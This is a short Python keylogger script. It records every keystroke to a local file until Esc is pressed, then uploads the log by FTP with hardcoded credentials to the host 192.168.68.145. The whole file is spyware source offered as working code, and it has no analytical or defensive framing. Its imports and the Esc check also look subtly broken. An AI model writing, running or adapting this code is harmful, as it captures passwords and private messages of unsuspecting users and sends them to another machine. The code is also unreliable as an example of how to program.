from pynput import key, Listener
import logging
import ftplib

logdir = ""
logging.basicConfig(filename=(logdir+"klog-res.txt"), level=logging.DEBUG, format="%(asctime)s:%(message)s")

def pressing_key(key):
    try:
        logging.info(str(key))
    except AttributeError:
        print("A special key {0} has been pressed.".format(key))

def releasing_key(key):
    if key == key.esc:
        return False

print("\nStarted listenning...")

with Listener(on_press=pressing_key, on_release=releasing_key) as listener:
    listener.join()

print("\nConnecting to the FTP and sending the data...")

sess = ftplib.FTP("192.168.68.145", "user", "password")
file = open("klog-res.txt", "rb")
sess.storbinary("STOR klog-res.txt",file)
file.close()
sess.quit()
